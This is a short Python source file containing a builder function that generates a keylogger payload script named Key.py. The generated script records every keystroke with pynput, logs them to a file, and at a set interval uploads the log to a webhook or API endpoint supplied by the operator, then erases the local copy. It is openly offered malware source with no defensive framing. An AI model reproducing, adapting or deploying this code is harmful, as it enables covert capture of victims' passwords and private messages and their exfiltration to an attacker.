import os

def build_t(token: str, interval: str) -> None: """ Generates a simple keylogger payload script with the provided token and interval.

Args:
    token (str): The webhook or API token to send logs to.
    interval (str): Time interval between log sends (in minutes).
"""
payload_code = f'''

import time import requests import logging from pynput import keyboard

TOKEN = "{token}" INTERVAL = {interval} * 60  # convert minutes to seconds LOG_FILE = "keylogs.txt"

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key): try: logging.info(str(key.char)) except AttributeError: logging.info(str(key))

listener = keyboard.Listener(on_press=on_press) listener.start()

while True: time.sleep(INTERVAL) with open(LOG_FILE, 'rb') as f: files = {'file': f} response = requests.post(TOKEN, files=files)

if response.status_code == 200:
    open(LOG_FILE, 'w').close()  # Clear the log file after sending

'''

with open("Key.py", "w") as f:
    f.write(payload_code)

print("Payload 'Key.py' successfully generated.")

